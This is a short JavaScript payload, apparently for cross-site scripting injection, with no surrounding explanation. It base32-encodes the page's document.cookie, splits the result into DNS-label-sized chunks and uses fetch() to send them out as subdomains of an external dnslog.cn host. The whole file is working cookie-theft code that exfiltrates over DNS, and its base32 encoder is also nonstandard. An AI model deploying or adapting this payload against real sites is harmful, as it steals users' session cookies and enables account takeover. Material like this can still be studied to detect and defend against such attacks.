function encodeBase32(data) {const base32Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let binaryString = '';let base32String = '';for (let i = 0; i < data.length; i++) {binaryString += data.charCodeAt(i).toString(2).padStart(8, '0');}for (let i = 0; i < binaryString.length; i += 5) {const binaryChunk = binaryString.slice(i, i + 5);const base32Index = parseInt(binaryChunk, 2);base32String += base32Chars[base32Index];}while (base32String.length % 8 !== 0) {base32String += 'A';}return base32String;}
function lc(str, num) {let strArr = [];for (let i = 0; i < str.length; i += num) strArr.push(str.slice(i, i + num));return strArr;}
let t = lc(encodeBase32(document.cookie),20);
let ans = '';
for (let i = 0; i < t.length; i += 1)ans += t[i] + '.';
fetch('https://' + ans + 'mrfhak.dnslog.cn');
